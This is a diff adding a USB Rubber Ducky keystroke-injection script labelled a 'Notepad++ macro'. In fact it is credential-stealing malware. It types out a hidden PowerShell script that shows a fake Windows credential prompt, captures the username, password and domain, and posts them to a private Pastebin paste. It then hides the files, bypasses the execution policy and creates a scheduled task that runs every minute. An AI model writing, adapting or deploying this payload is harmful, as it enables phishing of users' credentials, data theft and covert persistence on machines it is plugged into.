@@ -1,0 +1,175 @@
+REM Notepad++ Ducky macro by PrickleyPaw
+REM Description:
+REM Author:
+CONTROL ESCAPE
+STRING Command
+DELAY 200
+MENU
+DELAY 300
+STRING A
+DELAY 500
+ALT Y
+DELAY 500
+ALT SPACE
+STRING M
+REM DOWN
+REM DOWN
+REM DOWN 
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN 
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN 
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+REM DOWN
+ENTER
+REM Start payload here...
+STRING cd %homepath%
+ENTER
+STRING del /a cred.ps1
+ENTER
+STRING del /a getcreds.bat
+ENTER
+STRING echo while(1) >>cred.ps1
+ENTER
+STRING echo { >>cred.ps1
+ENTER
+REM STRING echo STRING echo start-sleep -seconds 20 >>cred.ps1
+ENTER
+STRING echo $credential = $host.ui.PromptForCredential("Need credentials", "Please enter your user name and password.", "", "") >>cred.ps1
+ENTER
+STRING echo if($credential) >>cred.ps1
+ENTER
+STRING echo { >>cred.ps1
+ENTER
+STRING echo $creds = $credential.GetNetworkCredential()>>cred.ps1
+ENTER
+STRING echo [String]$user = $creds.username >>cred.ps1
+ENTER
+STRING echo [String]$pass = $creds.password >>cred.ps1
+ENTER
+STRING echo [String]$domain = $creds.domain>>cred.ps1
+ENTER
+STRING echo	 $pastevalue = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain >>cred.ps1
+ENTER
+REM STRING echo $pastevalue >>cred.ps1
+REM ENTER
+STRING echo break >>cred.ps1
+ENTER
+STRING echo } >>cred.ps1
+ENTER
+STRING echo } >>cred.ps1
+ENTER
+STRING echo #$default = [System.Net.CredentialCache]::DefaultCredentials; >>cred.ps1
+ENTER
+STRING echo Function Post_http($url,$parameters){ >>cred.ps1
+ENTER
+STRING echo $http_request = New-Object -ComObject Msxml2.XMLHTTP >>cred.ps1
+ENTER
+STRING echo $http_request.open('POST', $url, $false) >>cred.ps1
+ENTER
+STRING echo $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") >>cred.ps1
+ENTER
+STRING echo $http_request.setRequestHeader("Content-length", $parameters.length); >>cred.ps1
+ENTER
+STRING echo $http_request.setRequestHeader("Connection", "close") >>cred.ps1
+ENTER
+STRING echo $http_request.send($parameters) >>cred.ps1
+ENTER
+STRING echo $script:session_key=$http_request.responseText >>cred.ps1
+ENTER
+STRING echo } >>cred.ps1
+ENTER
+REM need pastebin creds below
+STRING echo Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=pastebinapi&api_user_name=pastebinuser&api_user_password=pastebinpwd" >>cred.ps1
+ENTER
+STRING echo Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=pastebinapi&api_paste_name=creds&api_paste_code=$pastevalue&api_paste_private=2" >>cred.ps1
+ENTER
+STRING ATTRIB +H cred.ps1
+ENTER
+STRING echo powershell.exe -ExecutionPolicy Bypass -noLogo -command %homepath%\cred.ps1 >>getcreds.bat
+ENTER
+STRING ATTRIB +H getcreds.bat
+ENTER
+STRING schtasks /create /sc minute /TN "test" /TR "%homepath%\getcreds.bat
+ENTER
+REM ALT SPACE
+REM STRING C
+
